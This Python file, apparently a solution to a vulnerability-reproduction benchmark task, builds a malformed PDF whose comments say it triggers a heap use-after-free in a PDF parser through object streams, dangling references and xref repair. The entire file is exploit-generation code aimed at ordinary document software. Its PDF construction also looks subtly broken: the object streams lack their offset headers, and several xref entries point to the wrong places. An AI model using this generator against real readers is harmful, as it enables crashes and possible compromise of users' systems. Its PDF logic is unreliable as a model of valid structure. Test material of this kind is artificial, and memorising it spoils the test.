import os
import subprocess
import tempfile
import struct
import zlib
import io
import random
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build the PDF that triggers heap use-after-free
        return self.build_exploit_pdf()
    
    def build_exploit_pdf(self) -> bytes:
        """Build a PDF that triggers the heap use-after-free vulnerability"""
        
        # Create PDF header
        pdf = io.BytesIO()
        pdf.write(b"%PDF-1.4\n")
        
        # Track object offsets
        obj_offsets = {}
        
        # Object 1: Catalog
        obj_offsets[1] = pdf.tell()
        pdf.write(b"1 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Type /Catalog\n")
        pdf.write(b"  /Pages 2 0 R\n")
        pdf.write(b">>\n")
        pdf.write(b"endobj\n\n")
        
        # Object 2: Pages
        obj_offsets[2] = pdf.tell()
        pdf.write(b"2 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Type /Pages\n")
        pdf.write(b"  /Kids [3 0 R]\n")
        pdf.write(b"  /Count 1\n")
        pdf.write(b">>\n")
        pdf.write(b"endobj\n\n")
        
        # Object 3: Page
        obj_offsets[3] = pdf.tell()
        pdf.write(b"3 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Type /Page\n")
        pdf.write(b"  /Parent 2 0 R\n")
        pdf.write(b"  /MediaBox [0 0 612 792]\n")
        pdf.write(b"  /Contents 4 0 R\n")
        pdf.write(b">>\n")
        pdf.write(b"endobj\n\n")
        
        # Object 4: Content stream - just a simple text
        obj_offsets[4] = pdf.tell()
        pdf.write(b"4 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Length 43\n")
        pdf.write(b">>\n")
        pdf.write(b"stream\n")
        pdf.write(b"BT /F1 24 Tf 100 700 Td (Test) Tj ET\n")
        pdf.write(b"endstream\n")
        pdf.write(b"endobj\n\n")
        
        # Object 5: Object stream that will cause issues
        # This objstm will contain multiple objects that trigger the vulnerability
        obj_offsets[5] = pdf.tell()
        
        # Create object stream content
        # First object in stream: simple dictionary
        obj6_in_stream = b"6 0 obj\n<<\n  /Type /Font\n  /Subtype /Type1\n  /BaseFont /Helvetica\n>>\nendobj\n"
        
        # Second object in stream: another dictionary that references back
        obj7_in_stream = b"7 0 obj\n<<\n  /Type /FontDescriptor\n  /FontName /Helvetica\n  /FontBBox [-166 -225 1000 931]\n  /Flags 4\n  /CapHeight 718\n  /Ascent 718\n  /Descent -207\n>>\nendobj\n"
        
        # Third object: circular reference to cause issues
        obj8_in_stream = b"8 0 obj\n<<\n  /Type /ExtGState\n  /CA 1.0\n  /ca 1.0\n  /BM /Normal\n  /AIS false\n>>\nendobj\n"
        
        # Fourth object: more complex to trigger xref solidification
        obj9_in_stream = b"9 0 obj\n<<\n  /Type /XObject\n  /Subtype /Form\n  /BBox [0 0 100 100]\n  /Matrix [1 0 0 1 0 0]\n  /Resources <<\n    /XObject <<\n      /Im1 10 0 R\n    >>\n    /ExtGState <<\n      /GS1 8 0 R\n    >>\n  >>\n  /Length 0\n>>\nstream\nendstream\nendobj\n"
        
        # Fifth object: invalid to trigger repair
        obj10_in_stream = b"10 0 obj\n<<\n  /Type /XObject\n  /Subtype /Image\n  /Width 1\n  /Height 1\n  /ColorSpace /DeviceRGB\n  /BitsPerComponent 8\n  /Length 3\n>>\nstream\n\xFF\xFF\xFF\nendstream\nendobj\n"
        
        # Combine objects for the stream
        stream_objects = obj6_in_stream + obj7_in_stream + obj8_in_stream + obj9_in_stream + obj10_in_stream
        
        # Compress the stream
        compressed_stream = zlib.compress(stream_objects)
        
        # Write objstm header
        pdf.write(b"5 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Type /ObjStm\n")
        pdf.write(b"  /N 5\n")  # Number of objects in stream
        pdf.write(b"  /First 80\n")  # Offset to first object
        pdf.write(b"  /Length %d\n" % len(compressed_stream))
        pdf.write(b"  /Filter /FlateDecode\n")
        pdf.write(b">>\n")
        pdf.write(b"stream\n")
        pdf.write(compressed_stream)
        pdf.write(b"\nendstream\n")
        pdf.write(b"endobj\n\n")
        
        # Object 11: Another object stream with problematic references
        obj_offsets[11] = pdf.tell()
        
        # Create another set of objects that will be loaded after the first objstm
        # These create dangling references
        obj12_in_stream = b"12 0 obj\n<<\n  /Type /Pattern\n  /PatternType 1\n  /PaintType 1\n  /TilingType 1\n  /BBox [0 0 100 100]\n  /XStep 100\n  /YStep 100\n  /Resources <<\n    /XObject <<\n      /Fm1 13 0 R\n    >>\n  >>\n  /Matrix [1 0 0 1 0 0]\n  /Length 0\n>>\nstream\nendstream\nendobj\n"
        
        obj13_in_stream = b"13 0 obj\n<<\n  /Type /XObject\n  /Subtype /Form\n  /FormType 1\n  /BBox [0 0 100 100]\n  /Matrix [1 0 0 1 0 0]\n  /Resources <<\n    /XObject <<\n      /Im2 10 0 R\n    >>\n  >>\n  /Length 0\n>>\nstream\nendstream\nendobj\n"
        
        stream2_objects = obj12_in_stream + obj13_in_stream
        compressed_stream2 = zlib.compress(stream2_objects)
        
        pdf.write(b"11 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Type /ObjStm\n")
        pdf.write(b"  /N 2\n")
        pdf.write(b"  /First 46\n")
        pdf.write(b"  /Length %d\n" % len(compressed_stream2))
        pdf.write(b"  /Filter /FlateDecode\n")
        pdf.write(b">>\n")
        pdf.write(b"stream\n")
        pdf.write(compressed_stream2)
        pdf.write(b"\nendstream\n")
        pdf.write(b"endobj\n\n")
        
        # Object 14: A font that references the objstm objects
        obj_offsets[14] = pdf.tell()
        pdf.write(b"14 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Type /Font\n")
        pdf.write(b"  /Subtype /Type0\n")
        pdf.write(b"  /BaseFont /ABCDEE+Cambria\n")
        pdf.write(b"  /Encoding /Identity-H\n")
        pdf.write(b"  /DescendantFonts [15 0 R]\n")
        pdf.write(b"  /ToUnicode 16 0 R\n")
        pdf.write(b">>\n")
        pdf.write(b"endobj\n\n")
        
        # Object 15: CIDFont that triggers more loading
        obj_offsets[15] = pdf.tell()
        pdf.write(b"15 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Type /Font\n")
        pdf.write(b"  /Subtype /CIDFontType2\n")
        pdf.write(b"  /BaseFont /Cambria\n")
        pdf.write(b"  /CIDSystemInfo <<\n")
        pdf.write(b"    /Registry (Adobe)\n")
        pdf.write(b"    /Ordering (Identity)\n")
        pdf.write(b"    /Supplement 0\n")
        pdf.write(b"  >>\n")
        pdf.write(b"  /FontDescriptor 17 0 R\n")
        pdf.write(b"  /W [1 [500]]\n")
        pdf.write(b"  /CIDToGIDMap /Identity\n")
        pdf.write(b">>\n")
        pdf.write(b"endobj\n\n")
        
        # Object 16: ToUnicode CMap
        obj_offsets[16] = pdf.tell()
        pdf.write(b"16 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Length 97\n")
        pdf.write(b">>\n")
        pdf.write(b"stream\n")
        pdf.write(b"/CIDInit /ProcSet findresource begin\n")
        pdf.write(b"12 dict begin\n")
        pdf.write(b"begincmap\n")
        pdf.write(b"/CIDSystemInfo <<\n")
        pdf.write(b"  /Registry (Adobe)\n")
        pdf.write(b"  /Ordering (UCS)\n")
        pdf.write(b"  /Supplement 0\n")
        pdf.write(b">> def\n")
        pdf.write(b"/CMapName /Adobe-Identity-UCS def\n")
        pdf.write(b"/CMapType 2 def\n")
        pdf.write(b"1 begincodespacerange\n")
        pdf.write(b"<0000> <FFFF>\n")
        pdf.write(b"endcodespacerange\n")
        pdf.write(b"1 beginbfrange\n")
        pdf.write(b"<0000> <0001> <0000>\n")
        pdf.write(b"endbfrange\n")
        pdf.write(b"endcmap\n")
        pdf.write(b"CMapName currentdict /CMap defineresource pop\n")
        pdf.write(b"end\n")
        pdf.write(b"endstream\n")
        pdf.write(b"endobj\n\n")
        
        # Object 17: FontDescriptor that references back
        obj_offsets[17] = pdf.tell()
        pdf.write(b"17 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Type /FontDescriptor\n")
        pdf.write(b"  /FontName /Cambria\n")
        pdf.write(b"  /FontStretch /Normal\n")
        pdf.write(b"  /FontWeight 400\n")
        pdf.write(b"  /Flags 4\n")
        pdf.write(b"  /FontBBox [-147 -269 1122 939]\n")
        pdf.write(b"  /ItalicAngle 0\n")
        pdf.write(b"  /Ascent 939\n")
        pdf.write(b"  /Descent -269\n")
        pdf.write(b"  /CapHeight 679\n")
        pdf.write(b"  /StemV 80\n")
        pdf.write(b"  /XHeight 471\n")
        pdf.write(b"  /FontFile2 18 0 R\n")
        pdf.write(b">>\n")
        pdf.write(b"endobj\n\n")
        
        # Object 18: Font file (minimal CFF)
        obj_offsets[18] = pdf.tell()
        pdf.write(b"18 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Length 100\n")
        pdf.write(b"  /Length1 100\n")
        pdf.write(b">>\n")
        pdf.write(b"stream\n")
        # Minimal CFF header
        pdf.write(b"\x01\x00\x04\x01\x00\x01\x01\x00\x00")  # CFF header
        pdf.write(b"\x00\x01\x00\x00\x00\x00\x00\x00")  # Name INDEX
        pdf.write(b"\x00\x01\x00\x00\x00\x00\x00\x00")  # Top DICT INDEX
        pdf.write(b"\x00\x01\x00\x00\x00\x00\x00\x00")  # String INDEX
        pdf.write(b"\x00\x01\x00\x00\x00\x00\x00\x00")  # Global Subr INDEX
        pdf.write(b"A" * 60)  # Padding
        pdf.write(b"\nendstream\n")
        pdf.write(b"endobj\n\n")
        
        # Now create xref table with problematic entries
        # We'll create xref entries that point to freed objects
        
        xref_offset = pdf.tell()
        
        # Write xref table
        pdf.write(b"xref\n")
        pdf.write(b"0 19\n")  # 19 entries (0-18)
        
        # Entry 0: free object
        pdf.write(b"0000000000 65535 f \n")
        
        # Write entries for objects 1-4
        for i in range(1, 5):
            offset = obj_offsets[i]
            pdf.write(b"%010d 00000 n \n" % offset)
        
        # Object 5 (objstm) - this will trigger the vulnerability
        pdf.write(b"%010d 00000 n \n" % obj_offsets[5])
        
        # Objects 6-10 are in the objstm (object 5), so they have special offsets
        # These point to object 5 with index in the stream
        for i in range(6, 11):
            # Point to object 5 with stream index
            # This creates the situation where loading these objects requires
            # loading from the objstm, which can trigger xref solidification
            pdf.write(b"%010d 00000 n \n" % obj_offsets[5])
        
        # Objects 11-18
        for i in range(11, 19):
            offset = obj_offsets.get(i, 0)
            if offset:
                pdf.write(b"%010d 00000 n \n" % offset)
            else:
                # Fill with zeros for missing objects
                pdf.write(b"0000000000 00000 n \n")
        
        # Write trailer
        pdf.write(b"trailer\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Size 19\n")
        pdf.write(b"  /Root 1 0 R\n")
        pdf.write(b"  /Info 19 0 R\n")
        pdf.write(b">>\n")
        
        # Object 19: Info dictionary (after xref to create more complexity)
        info_offset = pdf.tell()
        pdf.write(b"19 0 obj\n")
        pdf.write(b"<<\n")
        pdf.write(b"  /Title (Exploit PDF)\n")
        pdf.write(b"  /Author (Exploit)\n")
        pdf.write(b"  /Creator (Exploit Generator)\n")
        pdf.write(b"  /CreationDate (D:20230101000000)\n")
        pdf.write(b"  /ModDate (D:20230101000000)\n")
        pdf.write(b">>\n")
        pdf.write(b"endobj\n\n")
        
        # Update xref for object 19
        # We need to patch the xref table
        pdf_data = pdf.getvalue()
        
        # Find xref table and update entry for object 19
        xref_pos = pdf_data.find(b"xref\n")
        if xref_pos != -1:
            # Calculate position of entry 19 in xref
            # Entry 0 is at xref_pos + 5 (after "xref\n")
            # Each entry is 20 bytes (including newline)
            entry_19_pos = xref_pos + 5 + (19 * 20)
            
            # Build new xref with corrected entry 19
            new_xref = b"xref\n"
            new_xref += b"0 20\n"  # Now 20 entries
            
            # Entry 0
            new_xref += b"0000000000 65535 f \n"
            
            # Entries 1-4
            for i in range(1, 5):
                offset = obj_offsets[i]
                new_xref += b"%010d 00000 n \n" % offset
            
            # Entry 5
            new_xref += b"%010d 00000 n \n" % obj_offsets[5]
            
            # Entries 6-10 (point to objstm)
            for i in range(6, 11):
                new_xref += b"%010d 00000 n \n" % obj_offsets[5]
            
            # Entries 11-18
            for i in range(11, 19):
                offset = obj_offsets.get(i, 0)
                if offset:
                    new_xref += b"%010d 00000 n \n" % offset
                else:
                    new_xref += b"0000000000 00000 n \n"
            
            # Entry 19
            new_xref += b"%010d 00000 n \n" % info_offset
            
            # Replace the old xref
            # Find end of xref (after all entries)
            xref_end = pdf_data.find(b"trailer\n", xref_pos)
            if xref_end != -1:
                new_pdf_data = pdf_data[:xref_pos] + new_xref + pdf_data[xref_end:]
                
                # Update trailer to reflect new size
                trailer_pos = new_pdf_data.find(b"trailer\n", xref_pos)
                if trailer_pos != -1:
                    trailer_end = new_pdf_data.find(b">>", trailer_pos)
                    if trailer_end != -1:
                        # Replace /Size 19 with /Size 20
                        trailer = new_pdf_data[trailer_pos:trailer_end+2]
                        trailer = trailer.replace(b"/Size 19", b"/Size 20")
                        new_pdf_data = new_pdf_data[:trailer_pos] + trailer + new_pdf_data[trailer_end+2:]
                        
                        # Add startxref
                        startxref_pos = new_pdf_data.rfind(b"endobj\n\n") + 8
                        new_pdf_data = new_pdf_data[:startxref_pos] + b"startxref\n" + str(xref_offset).encode() + b"\n%%EOF\n"
                        
                        pdf_data = new_pdf_data
        
        return pdf_data
